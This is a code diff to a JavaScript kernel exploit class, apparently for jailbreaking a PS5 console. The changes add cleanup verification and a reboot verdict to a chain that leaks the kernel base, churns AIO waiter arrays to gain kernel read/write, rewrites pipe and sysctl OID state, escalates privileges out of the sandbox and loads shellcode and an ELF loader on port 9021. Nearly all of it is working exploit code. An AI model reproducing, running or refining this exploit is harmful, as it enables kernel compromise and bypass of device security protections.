@@ -57,6 +57,18 @@ class KernelExploit {
 
     this.armedGroups = [];
 
+    // Cleanup bookkeeping. defuseAioGroups(), restoreOids(), restorePipes()
+    // and releaseAioWorkers() push here when they cannot verify or undo what
+    // the run changed; rescue() turns the list into the explicit verdict the
+    // page's orchestrator retries on. waitersDangling marks the point after
+    // which the armed groups' waiter arrays were churned and only a defuse
+    // can clear them; masterTouched marks the first write to the master pipe,
+    // which only the crossed fast path can put back.
+    this.cleanupProblems = [];
+    this.cleanupVerified = null;
+    this.waitersDangling = false;
+    this.masterTouched = false;
+
     this.scratch = {
       states: p.malloc(0x400, 1),
       qword: p.malloc(8, 1),
@@ -425,6 +437,12 @@ class KernelExploit {
     const churnRequest = (0x80000000 | ((requests * requestSize) << 16) | 0x4101) >>> 0;
     const preflight = await this.sysInt(SYS_IOCTL, 0xffffffff, churnRequest, nodes);
     if (preflight !== -1) return null;
+
+    // The churn below frees the armed groups' waiter arrays. From here on
+    // those waiters dangle into freed memory until defuseAioGroups() clears
+    // them, so rescue() must attempt a defuse even when the reclaim itself
+    // later fails.
+    this.waitersDangling = true;
 
     this.chain.clear();
     for (let i = 0; i < churnBefore; i++)
@@ -865,6 +883,9 @@ class KernelExploit {
     }
     await this.sysInt(SYS_READ, this.master.readFd, this.drainBuffer, 1);
 
+    // From the first field write on, the master pipe is modified kernel state
+    // that only this function's crossed-path cleanup knows how to undo.
+    this.masterTouched = true;
     const fields = [
       [count, 0],
       [inOff, 0],
@@ -1042,8 +1063,13 @@ class KernelExploit {
 
     const ok = skipped === 0 && failed === 0 && cleared + alreadyClear === total;
     this.defused = true;
-    if (!ok)
+    if (!ok) {
       await this.report("cleanup", `aio cleanup failed (${skipped} skipped, ${failed} failed)`);
+      // The caller must not treat a failed defuse as success: armed AIO
+      // waiters are exactly the state that must be gone before privileges
+      // change or payloads load.
+      this.cleanupProblems.push("aio groups remain armed");
+    }
     return ok;
   }
 
@@ -1072,7 +1098,23 @@ class KernelExploit {
 
   // restore
   async restoreOids() {
-    if (!this.crossed) return;
+    if (!this.crossed) {
+      // No fast kernel write path exists, but sysctl can still READ the oid
+      // state, so verify instead of restoring: if the reclaim races never
+      // flipped anything, the steering oid still has its original kind and
+      // the window oid is still hidden -- nothing to put back. Any other
+      // state is a modification this run cannot undo from here.
+      if (!this.mibA || !this.mibB) return true;
+      const kindA = await this.oidKind(this.mibA);
+      const kindB = await this.oidKind(this.mibB);
+      const untouched = kindA === this.off.oid.originalKind && kindB === null;
+      if (!untouched) {
+        await this.report("Cleanup",
+          "oid restore check failed: kernel r/w is not available and the oid state is not the original one");
+        return false;
+      }
+      return true;
+    }
 
     const { a, b, c, originalKind } = this.off.oid;
 
@@ -1090,17 +1132,30 @@ class KernelExploit {
     const stillVisible = (await this.oidKind(this.mibB)) !== null;
     const ok = cpus.rv === 0 && !stillVisible;
     if (!ok) await this.report("Cleanup", "oid restore check failed");
+    return ok;
   }
 
   async restorePipes() {
-    if (!this.crossed) return;
+    if (!this.crossed) {
+      // crossPipes never completed. If it had begun rewriting the master
+      // pipe, those fields are still in place and only the crossed fast path
+      // that never came up can undo them: the pipe state is unverified, not
+      // clean. If it never wrote a field, the pipes are still the ones
+      // locatePipes() created and verified.
+      if (this.masterTouched) {
+        await this.report("Cleanup",
+          "pipe buffer was not cleared: the master pipe fields written before the failure are still in place");
+        return false;
+      }
+      return true;
+    }
     this.crossed = false;
 
     const { buffer } = this.off.pipe;
 
     if ((await this.aimVictim(this.master.pipe, 0, this.pipeSize)) !== 0) {
       await this.report("Cleanup", "could not aim the victim at the master, leaving both armed");
-      return;
+      return false;
     }
 
     const zeroed = this.alloc(0x20);
@@ -1109,18 +1164,28 @@ class KernelExploit {
     const nulled = written === 0x18 && readBack === 0x18 &&
       this.readU32(this.drainBuffer, buffer) === 0 && this.readU32(this.drainBuffer, buffer + 4) === 0;
 
-    if (!nulled) await this.report("Cleanup", "pipe buffer was not cleared");
+    if (!nulled) {
+      await this.report("Cleanup", "pipe buffer was not cleared");
+      return false;
+    }
+    return true;
   }
 
   async releaseAioWorkers() {
-    if (!this.workerPark) return;
+    if (!this.workerPark) return true;
 
     try {
-      await this.sysInt(SYS_CLOSE, this.workerPark.writeFd);
+      const writes = await this.sysInt(SYS_CLOSE, this.workerPark.writeFd);
       await sleep(120);
-      await this.sysInt(SYS_CLOSE, this.workerPark.readFd);
+      const reads = await this.sysInt(SYS_CLOSE, this.workerPark.readFd);
+      if (writes === -1 || reads === -1) {
+        await this.report("Cleanup", "could not release aio workers");
+        return false;
+      }
+      return true;
     } catch {
       await this.report("Cleanup", "could not release aio workers");
+      return false;
     }
   }
 
@@ -1136,7 +1201,10 @@ class KernelExploit {
   async run() {
     await this.report("Kernel", "Starting kernel exploit");
 
-    try {
+    // The stages run linearly with early stops; the finally below always runs
+    // rescue() before the outcome reaches the caller, so the cleanup verdict
+    // recorded there is merged into the returned result.
+    const stages = async () => {
       // Find the kernel base and keep the race on one core.
       await this.leakKernelBase();
       await this.report("Kernel", "base 0x" + this.kbase.toString());
@@ -1155,9 +1223,14 @@ class KernelExploit {
         return await this.stop("fast read and write not established");
       await this.report("Kernel", "fast read and write ready");
 
-      // Clear the armed AIO groups before changing privileges.
+      // Clear the armed AIO groups before changing privileges. A failed
+      // defuse means armed waiters are still live in the kernel: escalating
+      // and loading payloads over them is exactly the uncontrolled state the
+      // cleanup exists to prevent, so stop here and let the verdict demand a
+      // reboot instead of carrying on.
       await this.report("Kernel", "checking aio groups");
-      await this.defuseAioGroups();
+      if (!(await this.defuseAioGroups()))
+        return await this.stop("aio groups did not defuse; not escalating over armed groups");
 
       await this.report("Kernel", "checking privileges");
       if (!(await this.escalate()))
@@ -1168,13 +1241,22 @@ class KernelExploit {
       const payloads = await this.launchShellcode();
       await this.report("Kernel", payloads ? "payloads loaded" : "finished");
       return { kbase: this.kbase, done: true, payloads };
+    };
+
+    let outcome;
+    try {
+      outcome = await stages();
     } catch (e) {
       await this.report("Kernel", String((e && e.message) || e));
       throw e;
     } finally {
-      // Restore temporary state even when a stage fails.
+      // Restore temporary state even when a stage fails, and record the
+      // cleanup verdict the returned result carries.
       await this.rescue();
     }
+    // rescue() in the finally above has run by now, so cleanupVerified is the
+    // verdict for THIS run, not a stale one.
+    return { ...outcome, clean: this.cleanupVerified === true };
   }
 
   async stop(why) {
@@ -1183,24 +1265,51 @@ class KernelExploit {
   }
 
   async rescue() {
+    const problems = this.cleanupProblems;
     try {
       if (this.pinnedCore !== undefined && !this.threadAttributesRestored)
         await this.restoreThreadAttributes();
 
       if (this.armedGroups.length && !this.defused) {
-        await this.report("Cleanup", "repairing aio groups");
-        if (!this.curproc) await this.findCurrentProcess();
-        if (this.curproc) await this.defuseAioGroups();
-        else await this.report("Cleanup", "current process unavailable");
+        if (!this.waitersDangling) {
+          // The reclaim never churned, so the armed groups are ordinary
+          // pending reads on socketpairs that are still valid: closing the
+          // descriptors below completes them, and nothing dangles in the
+          // kernel. Attempting a defuse without kernel r/w would only turn a
+          // harmless stop into a false "current process unavailable".
+          await this.report("Cleanup",
+            "the aio groups were never churned; their descriptors close below", "info");
+        } else {
+          await this.report("Cleanup", "repairing aio groups");
+          if (!this.curproc) await this.findCurrentProcess();
+          if (this.curproc) {
+            if (!(await this.defuseAioGroups()))
+              problems.push("aio groups remain armed");
+          } else {
+            await this.report("Cleanup", "current process unavailable");
+            problems.push("current process unavailable for the aio repair");
+          }
+        }
       }
 
-      await this.restoreOids();
-      await this.restorePipes();
-      await this.releaseAioWorkers();
+      if (!(await this.restoreOids())) problems.push("oid state was not restored");
+      if (!(await this.restorePipes())) problems.push("pipe state was not restored");
+      if (!(await this.releaseAioWorkers())) problems.push("aio workers were not released");
       await this.closeScratchDescriptors();
     } catch {
       await this.report("Cleanup", "failed");
+      problems.push("cleanup errored");
     }
+
+    // The explicit verdict. Only a rescue that verified every restoration may
+    // call the run clean: the page's orchestrator retries kernel failures on
+    // exactly this line, and treats anything else as a reboot demand, so a
+    // cleanup error can no longer hide behind a success further up the log.
+    this.cleanupVerified = problems.length === 0;
+    if (this.cleanupVerified)
+      await this.report("Cleanup", "verified the kernel state was restored", "success");
+    else
+      await this.report("Cleanup", "did not verify the kernel state: REBOOT the console", "error");
   }
 }
 
@@ -1241,6 +1350,7 @@ return async function (api) {
       "api.launchKexp is missing. This loader build predates the relapse payload: " +
       "re-cache the loader (installer, or reload the User's Guide) and send it again.",
       "error");
+    await api.log("the kernel was never touched, so there is nothing to clean", "info");
     return;
   }
 
@@ -1253,6 +1363,7 @@ return async function (api) {
       "api.prefetchKexp is missing. This loader build predates the relapse payload: " +
       "re-cache the loader (installer, or reload the User's Guide) and send it again.",
       "error");
+    await api.log("the kernel was never touched, so there is nothing to clean", "info");
     return;
   }
 
@@ -1267,6 +1378,7 @@ return async function (api) {
       `could not fetch the elfldr/kexp binaries: ${e && e.message ? e.message : e}. ` +
       `Check that host.py is still serving and the PS5 DNS still points at this PC.`,
       "error");
+    await api.log("the kernel was never touched, so there is nothing to clean", "info");
     return;
   }
 
@@ -1297,8 +1409,23 @@ return async function (api) {
     return;
   }
 
-  // Reaching here means escalate() passed its own getuid/is_in_sandbox check, and
-  // launchShellcode() got a truthy result back from api.launchKexp().
+  // The chain reached the payload launch, but the run only counts as a
+  // success when the exploit's own cleanup verified the kernel state. An
+  // unverified cleanup (armed aio groups, unrestored oids, a pipe buffer
+  // that stayed crossed) means the kernel is left modified: do not publish
+  // kernel access, do not let the autoload payload send anything over it,
+  // and say so with a line the page's latch treats as a reboot demand.
+  if (!result.clean) {
+    await api.log(
+      "the exploit finished, but its cleanup did not verify the kernel state -- " +
+      "no payloads will be sent and no krw handle is published. REBOOT the console " +
+      "before running the exploit again.", "error");
+    return;
+  }
+
+  // Reaching here means escalate() passed its own getuid/is_in_sandbox check,
+  // cleanup verified the kernel state, and launchShellcode() got a truthy
+  // result back from api.launchKexp().
   await api.log(`kernel base 0x${result.kbase.toString(16)}`, "success");
   await api.log("elfldr is listening on port 9021", "success");
 
